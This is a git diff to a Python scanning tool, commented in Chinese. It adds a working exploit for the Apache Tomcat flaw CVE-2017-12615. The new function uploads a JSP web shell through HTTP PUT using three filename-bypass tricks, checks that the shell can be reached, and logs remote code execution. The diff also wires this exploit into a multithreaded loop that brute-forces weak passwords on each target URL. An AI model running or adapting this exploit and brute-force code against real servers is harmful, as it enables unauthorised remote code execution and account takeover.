@@ -214,6 +214,62 @@ def validate_config(config):
 
     return True
 
+# CVE-2017-12615漏洞检测函数
+def check_cve_2017_12615(url,config):
+    try:
+        # 使用 generate_random_string 函数生成随机的 JSP 文件名
+        jsp_file_name = f"{generate_random_string()}.jsp"
+        # 从配置文件中读取 shell_file_content
+        shell_file_content = config['files'].get('shell_file_content', '<%-- 默认的 shell 内容 --%>')
+
+        headers = {
+            "User-Agent": "Mozilla/5.0",
+            "Connection": "close",
+            "Content-Type": "application/octet-stream"
+        }
+
+        # 清理 URL 确保正确格式
+        url = clean_url(url)
+
+        exploit_methods = [
+            f"{url}/{jsp_file_name}/",  # 利用方式 1: PUT /222.jsp/
+            f"{url}/{jsp_file_name}%20",  # 利用方式 2: PUT /222.jsp%20
+            f"{url}/{jsp_file_name}::$DATA"  # 利用方式 3: PUT /222.jsp::$DATA
+        ]
+        # 尝试每一种利用方式
+        for idx, method_url in enumerate(exploit_methods):
+            response = requests.put(method_url, data=shell_file_content, headers=headers, verify=False, timeout=10)
+            if response.status_code in [201, 204]:
+                check_url = f"{url}/{jsp_file_name}"
+                check_response = requests.get(check_url, verify=False, timeout=10)
+
+                if check_response.status_code == 200:
+                    logger.info(f"{Fore.RED}[+] 远程代码执行成功: {check_url} {Style.RESET_ALL} (利用方式: {method_url})")
+                    return True, check_url  # 成功后立即返回，不再继续尝试其他利用方式
+                else:
+                    logger.warning(f"{Fore.RED}[!] CVE-2017-12615 文件上传成功，但访问失败: {check_url} {Style.RESET_ALL}")
+            else:
+                logger.warning(f"{Fore.GREEN}[!] 失败: CVE-2017-12615 漏洞利用方式 {idx + 1} {method_url} {Style.RESET_ALL}")
+        return False, None    # 如果所有利用方式都失败
+
+    except requests.exceptions.RequestException as e:
+        return False, None
+
+# 在每个URL上执行CVE-2017-12615检测并继续进行弱口令检测
+def detect_and_check(url, usernames, passwords, output_file, config):
+    # 先进行CVE-2017-12615检测
+    success, exploit_url = check_cve_2017_12615(url,config)
+
+    if success:
+        with open(output_file, 'a', encoding='utf-8') as f:
+            f.write(f"{url} - CVE-2017-12615 Exploited: {exploit_url}\n")
+
+    # 无论漏洞利用成功与否，都进行弱口令检测
+    check_weak_password(url, usernames, passwords, output_file,
+                        config['retry']['check_weak_password']['max_retries'],
+                        config['retry']['check_weak_password']['retry_delay'],
+                        config)
+
 # 主函数
 def main():
     # 加载配置文件
@@ -241,13 +297,10 @@ def main():
     # 根据组合总数调整线程池大小
     workers = adjust_thread_pool_size(combination_count, max_workers_limit, min_workers, combination_per_thread)
 
-    # 使用线程池执行弱口令检测
+    # 使用线程池执行检测任务
     with ThreadPoolExecutor(max_workers=workers) as executor:
         futures = [
-            executor.submit(check_weak_password, url, usernames, passwords, output_file,
-                            config['retry']['check_weak_password']['max_retries'],
-                            config['retry']['check_weak_password']['retry_delay'],
-                            config) for url in urls
+            executor.submit(detect_and_check, url, usernames, passwords, output_file, config) for url in urls
         ]
 
         # 等待所有任务完成
